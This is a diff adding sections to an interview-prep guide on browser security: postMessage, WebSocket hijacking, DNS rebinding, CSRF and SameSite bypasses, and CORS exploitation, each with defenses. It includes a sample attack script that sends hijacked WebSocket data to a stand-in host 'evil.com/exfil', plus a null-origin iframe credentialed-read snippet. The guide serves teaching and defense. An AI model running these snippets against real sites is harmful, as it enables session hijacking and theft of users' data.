@@ -444,6 +444,285 @@ Note `frame-ancestors` also interacts with `SameSite`: a cross-site iframe won't
 framing controls are the direct fix. `X-Frame-Options` cannot express an allowlist of
 multiple origins; `frame-ancestors` can, which is another reason to prefer it.
 
+## Cross-Window Messaging with postMessage
+
+SOP forbids one window/iframe from touching another origin's DOM, but legitimate apps still
+need cross-origin windows to talk (widgets, SSO popups, embedded checkout). The sanctioned
+channel is **`window.postMessage(message, targetOrigin, [transfer])`** — the browser
+delivers the message to the target window and tags it with the *sender's* origin. Nearly
+every real-world postMessage bug is a missing or sloppy origin check on one of the two ends.
+
+**Sending safely.** Always name the exact recipient origin; **never use `"*"`**:
+
+```js
+otherWindow.postMessage(data, "https://widget.example.com");   // good
+otherWindow.postMessage(data, "*");                            // dangerous
+```
+With `"*"`, if the target window navigated to an attacker origin between your call and
+delivery (e.g., via an open redirect), the message — possibly a token or PII — is delivered
+to the attacker. The `targetOrigin` is a *delivery constraint*, not decoration.
+
+**Receiving safely.** In the `message` handler you MUST validate `event.origin` by **exact
+FQDN equality**, and treat `event.data` as untrusted input:
+
+```js
+window.addEventListener("message", (e) => {
+  if (e.origin !== "https://trusted.example.com") return;   // exact match
+  // NEVER: if (e.origin.indexOf("trusted.example.com") !== -1) ...
+  // NEVER: element.innerHTML = e.data;  // DOM-XSS sink
+});
+```
+The OWASP HTML5 Security Cheat Sheet calls out the `indexOf(".trusted.com")`/substring
+anti-pattern: `https://trusted.com.attacker.com` and `https://attacker-trusted.com` both
+satisfy a substring test. Also optionally validate `event.source` (the sender window
+reference) and never sink `event.data` into `innerHTML`, `eval`, `document.write`, or
+`Function()` — cross-origin data → HTML/JS sink is a top DOM-XSS vector (and a common
+**client-side CSRF** enabler; see below).
+
+> [!WARNING]
+> `postMessage` bypasses SOP by design. A wildcard `targetOrigin` on send **leaks data
+> after a redirect**; a substring `event.origin` check on receive **accepts attacker
+> origins**. Both are recurring, high-severity cross-site bugs.
+
+## document.domain and Origin-Agent-Cluster
+
+Historically two pages on sibling subdomains (`a.example.com`, `b.example.com`) could gain
+mutual DOM access by *both* setting `document.domain = "example.com"`. This is a coarse,
+dangerous relaxation:
+
+- It grants **blanket DOM access** to *every* page that also sets the same value — not a
+  scoped channel like `postMessage`.
+- Setting `document.domain` **resets the port component of the origin to `null`**, so a
+  neighbor on a *different port* of a shared host (common on shared hosting / dev proxies)
+  can now reach in. Effectively it widens the trust boundary to the whole eTLD+1.
+
+`document.domain` is **deprecated**. Modern browsers disable it when the page opts into
+**origin isolation** via `Origin-Agent-Cluster: ?1` (and it is unavailable under
+cross-origin isolation, i.e. COOP+COEP). Chromium has announced plans to make setting
+`document.domain` a no-op by default. The correct modern replacement for cross-subdomain
+communication is **`postMessage`** with explicit origin checks.
+
+## Cross-Site WebSocket Hijacking (CSWSH)
+
+A WebSocket connection **starts as an ordinary HTTP `GET`** with `Upgrade: websocket`. That
+handshake carries cookies exactly like any other request. If the server authenticates the
+handshake **solely by cookie** — with **no CSRF token and no `Origin` validation** — then an
+attacker page can open the socket cross-site:
+
+```js
+// on evil.com; victim is logged into wss://chat.example.com
+const ws = new WebSocket("wss://chat.example.com/socket");   // cookies ride along
+ws.onmessage = (m) => fetch("https://evil.com/exfil", {method:"POST", body:m.data});
+ws.onopen = () => ws.send('{"action":"readMessages"}');
+```
+
+CSWSH is **worse than classic CSRF**: `WebSocket` responses are **not** gated by CORS (SOP's
+read block does not apply to the WebSocket data channel), so the attacker gets **bidirectional
+read *and* write** inside the victim's authenticated session — they can both send commands and
+read replies. `Sec-WebSocket-Key` is an anti-caching/handshake-integrity nonce, **not**
+authentication or CSRF protection.
+
+**Defenses:** validate the `Origin` header **server-side on the handshake** (reject
+unexpected origins), require a **CSRF token / one-time ticket** in the handshake (query param
+or first message), and set **`SameSite`** on the session cookie so it isn't sent on the
+cross-site handshake.
+
+## Cross-Origin Isolation: COOP, COEP, CORP
+
+Post-Spectre, the browser gained a header family to control cross-origin *embedding and
+window references*, complementing CORS/CSP:
+
+- **`Cross-Origin-Opener-Policy` (COOP)** — controls the relationship with windows you open
+  or that open you. `Cross-Origin-Opener-Policy: same-origin` severs the `window.opener`
+  link across origins, so a page you navigate to cannot reach back into your window (defeats
+  many **XS-Leaks** and tabnabbing-style probing via `opener`).
+- **`Cross-Origin-Resource-Policy` (CORP)** — a *resource* declares who may embed it:
+  `same-origin`, `same-site`, or `cross-origin`. It lets a sensitive endpoint refuse
+  cross-origin `no-cors` embedding (mitigating Spectre side-channel reads and XSSI).
+- **`Cross-Origin-Embedder-Policy` (COEP)** — `require-corp` forces every subresource the
+  document loads to explicitly opt in (via CORP or CORS), so nothing is embedded by accident.
+
+Setting **COOP `same-origin` + COEP `require-corp`** makes a document **"cross-origin
+isolated,"** which is the gate for powerful APIs like `SharedArrayBuffer` and
+high-resolution `performance.now()` timers (restricted because they enable Spectre timing
+attacks). These are distinct from CORS: CORS governs *reading fetch responses*; this family
+governs *embedding, window references, and process isolation*.
+
+## Private Network Access (PNA)
+
+**Private Network Access** (formerly CORS-RFC1918) stops a page on a *public* origin from
+silently attacking devices on the user's **private/loopback network** — home routers, IoT
+devices, `localhost` dev servers, internal admin panels. When a public-origin page makes a
+request to a *more-private* address space (public → private, or anything → loopback), the
+browser sends a **preflight** carrying:
+
+```http
+Access-Control-Request-Private-Network: true
+```
+and the target must answer:
+```http
+Access-Control-Allow-Private-Network: true
+Access-Control-Allow-Origin: https://public.example.com
+```
+Otherwise the browser blocks it. Crucially this preflight fires **even for `no-cors`
+requests and even for what would otherwise be same-origin/simple requests** when the target
+address is more private — precisely because those are the requests classic CORS never
+guarded. PNA defends against **CSRF against internal devices** and against **DNS rebinding**.
+Chrome rolled it out as a warning (≈v104) moving toward enforcement. This is the mechanism
+that motivates fixes for "public website silently reaches `http://localhost:PORT`" RCE
+classes (e.g., the Zoom-style local-service exposure).
+
+## DNS Rebinding
+
+DNS rebinding is the canonical **"SOP does not save you"** attack — it defeats origin
+isolation *without* touching CORS. The attacker controls `attacker.com` with a very short
+DNS TTL:
+
+1. Victim loads `http://attacker.com`; it resolves to the attacker's server, which serves
+   malicious JS. The page's origin is `http://attacker.com`.
+2. The attacker's DNS then **re-resolves** `attacker.com` to a **private/internal IP** (e.g.,
+   `127.0.0.1` or `192.168.1.1`). The browser still considers requests to `attacker.com`
+   **same-origin** (the *hostname* is unchanged), so its JS can now freely read responses
+   from the internal service.
+3. The script talks to the internal service (router admin, cloud metadata proxy, dev tool)
+   in the victim's network context and exfiltrates the data.
+
+**Defenses:** strict **`Host`-header validation / allowlist** on the internal service
+(reject `Host: attacker.com`), DNS-rebinding protection in resolvers (drop private answers
+for public names), **Private Network Access**, requiring **authentication** on internal
+services, and **TLS** (a cert for `attacker.com` won't validate for `127.0.0.1`).
+
+## Login CSRF and Logout CSRF
+
+CSRF is usually framed as a *post-authentication* write, but two variants target the auth
+transition itself.
+
+**Login CSRF.** The attacker forges a login request using **their own credentials**, so the
+victim's browser is silently logged into the *attacker's* account. The victim then performs
+actions (saves payment info, searches, uploads) that land in the attacker's account, which
+the attacker later inspects. The lesson interviewers probe: **the login form itself needs
+CSRF protection even though the user is not yet authenticated** — you cannot bind a token to
+a session that doesn't exist yet, so you use a **pre-session token** issued to the anonymous
+visitor and then **rotate the session ID on successful authentication** (which also kills
+session fixation).
+
+**Logout CSRF.** Forcing a victim to log out is a low-severity nuisance/DoS, but it can be
+chained (e.g., force logout, then present a phishing login), so state-changing logout
+endpoints should also require POST + a token.
+
+## SameSite Bypasses and Edge Cases
+
+`SameSite` is strong but has well-known gaps that senior candidates are expected to recite
+(these are the exact PortSwigger lab scenarios):
+
+- **Chrome's "Lax-by-default" 2-minute window.** Cookies set with **no explicit `SameSite`**
+  are treated as Lax *except* they are still sent on **top-level cross-site POST** for the
+  first **120 seconds** after being set (a compatibility grace period for SSO/POST flows).
+  This window does **not** apply to cookies set with an **explicit `SameSite=Lax`**. An
+  attacker can *refresh* the window by forcing the site to re-issue the cookie via a
+  top-level navigation/popup (e.g., an OAuth round trip) right before firing the POST. Moral:
+  **explicitly set `SameSite=Lax`** rather than relying on the default.
+- **Method-override gadgets.** If the framework honors `_method=POST` (or
+  `X-HTTP-Method-Override`) on a GET, an attacker can smuggle a state change through the
+  Lax-allowed top-level GET navigation.
+- **Client-side (DOM) redirect gadgets bypass even `Strict`.** If the app has a *client-side*
+  open redirect (JS reads a param and does `location = param`), the browser treats the
+  resulting secondary request as **same-site** (the navigation originates from the site's own
+  document), so `Strict` cookies ARE sent. A **server-side** 3xx redirect does **not** do
+  this — the browser remembers the cross-site initiator and withholds the cookie. This
+  asymmetry is a favorite exam point.
+- **Sibling-subdomain / same-site attacker.** `SameSite` is keyed on the registrable site, so
+  an XSS or takeover on `other.example.com` can issue "same-site" requests to
+  `app.example.com`.
+
+## Client-Side CSRF
+
+Classic ("server-side") CSRF forges an *entire* request from an attacker page. **Client-side
+CSRF** is subtler: the victim page's **own trusted JavaScript** reads attacker-controlled
+input — a URL fragment/param, a `postMessage`, `localStorage` — and *itself* assembles and
+fires the state-changing request, **attaching the legitimate CSRF token automatically**.
+
+Because the app's own code builds the request, **token-based defenses do not help**: the
+token is present and valid. The bug is a client-side data-flow/injection flaw (an unsafe
+sink that lets the attacker steer the request URL/params/body). The fix is input validation
+and safe sinks in the client code (and Fetch-Metadata/`Origin` checks catch nothing here
+because the request *is* same-origin). This is why "we have CSRF tokens everywhere" is not a
+complete answer.
+
+## Advanced CORS Exploitation
+
+Beyond the reflect-origin bug, several CORS pitfalls turn even *partly*-correct
+configurations into data-theft primitives:
+
+- **Weaponizing an allowlisted `null` origin.** A server that allowlists `null` "for local
+  dev/sandbox" is exploitable: an attacker embeds a **sandboxed iframe** whose document emits
+  `Origin: null`, then makes the credentialed read from inside it:
+  ```html
+  <iframe sandbox="allow-scripts allow-forms"
+          srcdoc="<script>fetch('https://api.example.com/me',{credentials:'include'})
+                  .then(r=>r.text()).then(d=>/* exfiltrate */)</script>"></iframe>
+  ```
+  The sandbox forces the framed document's origin to `null`, matching the allowlist.
+- **Trusted-origin XSS = CORS trust chain.** Even a *correctly* allowlisted origin creates a
+  trust dependency: an **XSS on any allowlisted subdomain** lets attacker script issue the
+  credentialed cross-origin read against the main API. Your CORS security is only as strong
+  as the *weakest allowlisted origin*.
+- **Allowlisting an `http://` subdomain breaks TLS.** If an HTTPS API allowlists an
+  `http://` origin (e.g., `http://dev.example.com`), a network MITM can inject a page on that
+  plaintext origin that then performs the credentialed CORS read of `https://` data —
+  effectively **downgrading an otherwise HTTPS-only app**. Allowlist only `https://` origins.
+- **CORS cache poisoning.** If the reflected `Access-Control-Allow-Origin` is an **unkeyed
+  input** to a shared/CDN cache, an attacker can poison the cache so a response carrying
+  *their* origin's ACAO is served to victims, or a public cache entry is stored with a
+  victim-origin ACAO. Fix: send **`Vary: Origin`** and **do not cache credentialed
+  responses** in shared caches.
+- **`Access-Control-Expose-Headers`.** By default script can read only a small safelist of
+  response headers (`Cache-Control`, `Content-Language`, `Content-Type`, `Expires`,
+  `Last-Modified`, `Pragma`). `Expose-Headers` opts additional response headers into being
+  readable cross-origin; over-exposing it (or `*` on non-credentialed responses) can leak
+  sensitive headers (internal IDs, tokens) to allowed origins.
+
+## Content-Type Boundary, text/plain Smuggling, and GraphQL CSRF
+
+The custom-header / "JSON is preflighted" CSRF defense **rests entirely on the preflight**,
+and the preflight is triggered by the CORS-safelist boundary. The exact boundary: a
+`Content-Type` avoids preflight only if it is **`application/x-www-form-urlencoded`,
+`multipart/form-data`, or `text/plain`**. Attackers weaponize this:
+
+- **`text/plain` smuggling.** A cross-origin `fetch` can send a **JSON-shaped body with
+  `Content-Type: text/plain`** — a safelisted type, so **no preflight fires**. A server that
+  parses the body as JSON *regardless of Content-Type* (many do) is then **CSRF-able** even
+  though "it only accepts JSON." Defense: **strictly reject** requests whose `Content-Type`
+  isn't exactly `application/json` for JSON endpoints (and/or require a custom header +
+  validate it).
+- **GraphQL CSRF.** A single GraphQL endpoint that accepts queries/mutations via **`GET`** or
+  via **`application/x-www-form-urlencoded` / `text/plain` POST** bypasses the "GraphQL is
+  JSON so it's preflighted" assumption — a mutation can be forged with a simple request.
+  Defense: only accept `application/json` (or enforce a CSRF token / custom header), disable
+  mutations over GET, and verify `Content-Type`.
+
+> [!WARNING]
+> "Our API only takes JSON, so it's safe from CSRF" is a classic wrong answer. Unless the
+> server **enforces** the `application/json` Content-Type (rejecting `text/plain`) or checks
+> a token/Origin, an attacker sends the JSON body as `text/plain` and dodges the preflight.
+
+## Cookie Prefixes and Cookie-Stored JWTs
+
+Two nuances round out cookie-based CSRF defense:
+
+- **`__Host-` vs `__Secure-` prefixes (RFC 6265bis).** A cookie named `__Secure-*` must be set
+  `Secure` (HTTPS). A cookie named **`__Host-*`** additionally must have **no `Domain`
+  attribute** and **`Path=/`**, which pins it to the exact host that set it. This defeats
+  **subdomain cookie injection** — a sibling/attacker subdomain **cannot** overwrite a
+  `__Host-` cookie for the parent (there is no `Domain` scope to widen), which is exactly why
+  `__Host-` beats `__Secure-` for CSRF tokens and session cookies (it hardens double-submit
+  against the sibling-subdomain bypass).
+- **Cookie-stored JWTs re-introduce CSRF.** A bearer token is CSRF-safe *only* because the
+  browser doesn't auto-attach it — the SPA adds it explicitly. The moment you move that JWT
+  **into a cookie** ("JWT-in-cookie" sessions), the browser auto-sends it and the endpoint is
+  **CSRF-able again**, needing SameSite + token/Origin defense like any cookie session.
+  "We use JWT, so we don't need CSRF protection" is false once the JWT lives in a cookie.
+
 ## Common follow-up questions
 
 - **"What exactly defines an origin, and how does it differ from a site?"** Origin =
@@ -471,7 +750,29 @@ multiple origins; `frame-ancestors` can, which is another reason to prefer it.
   `frame-ancestors` / `X-Frame-Options`.
 - **"Are bearer-token (Authorization header) APIs vulnerable to CSRF?"** Not to classic
   cookie CSRF, because the token isn't auto-attached by the browser — the app must add it
-  explicitly. Cookie/Basic-auth sessions are the vulnerable case.
+  explicitly. Cookie/Basic-auth sessions (and **JWT-in-cookie**) are the vulnerable case.
+- **"How do two windows on different origins communicate safely?"** `postMessage` with an
+  explicit `targetOrigin` on send and an **exact** `event.origin` check on receive; never
+  `"*"`, never a substring check, never sink `event.data` into an HTML/JS sink.
+- **"How do two subdomains share the DOM today?"** Not `document.domain` (deprecated, widens
+  trust to eTLD+1 and nulls the port; disabled by `Origin-Agent-Cluster`/COOP+COEP) — use
+  `postMessage`.
+- **"A chat app authenticates its WebSocket handshake with cookies only — what's the risk?"**
+  Cross-Site WebSocket Hijacking (CSWSH): an attacker page opens the socket cross-site with
+  the victim's cookies and gets bidirectional read/write. Fix: server-side `Origin` check +
+  CSRF ticket + `SameSite`.
+- **"A public site can reach `http://localhost:PORT` — what stops it now?"** Private Network
+  Access preflight (`Access-Control-Request/Allow-Private-Network`) plus `Host`-header
+  validation; the same class of fix mitigates DNS rebinding.
+- **"`SameSite=Strict` everywhere — are we CSRF-immune?"** No — sibling-subdomain requests, a
+  client-side (DOM) open-redirect gadget that re-issues a same-site request, and client-side
+  CSRF all survive; still need a token/Origin check.
+- **"Our API only accepts JSON, so no CSRF?"** Only if you *enforce* the Content-Type — an
+  attacker sends the JSON body as `text/plain` (a safelisted type, no preflight); GraphQL
+  over GET/`text/plain` is the same trap.
+- **"Why `__Host-` over `__Secure-` for CSRF/session cookies?"** `__Host-` forbids `Domain`
+  and requires `Path=/`, pinning the cookie to the exact host so a sibling subdomain can't
+  overwrite it (hardens double-submit against cookie injection).
 
 ## References
 
@@ -488,3 +789,13 @@ multiple origins; `frame-ancestors` can, which is another reason to prefer it.
 - CSP Level 3 — `frame-ancestors`: https://www.w3.org/TR/CSP3/#directive-frame-ancestors
 - OWASP Top 10 2021 A05 Security Misconfiguration (CORS misconfig): https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
 - MDN — `Sec-Fetch-Site` (Fetch Metadata): https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Sec-Fetch-Site
+- OWASP HTML5 Security Cheat Sheet — `postMessage` send/receive rules, origin-check anti-patterns: https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html
+- MDN — `Window.postMessage()`: https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage
+- MDN — `document.domain` (deprecated) and `Origin-Agent-Cluster`: https://developer.mozilla.org/en-US/docs/Web/API/Document/domain
+- OWASP WSTG — Testing WebSockets (Cross-Site WebSocket Hijacking): https://owasp.org/www-project-web-security-testing-guide/
+- MDN — Cross-Origin-Opener-Policy (COOP): https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Opener-Policy
+- MDN — Cross-Origin-Resource-Policy (CORP) & Cross-Origin-Embedder-Policy (COEP): https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Embedder-Policy
+- web.dev — Cross-origin isolation (COOP+COEP, SharedArrayBuffer gate): https://web.dev/articles/coop-coep
+- W3C/WICG Private Network Access: https://wicg.github.io/private-network-access/
+- OWASP — DNS Rebinding / SSRF prevention context; PortSwigger Web Security Academy CORS, SameSite, and CSWSH labs: https://portswigger.net/web-security
+- RFC 6265bis — `__Host-`/`__Secure-` cookie name prefixes: https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis
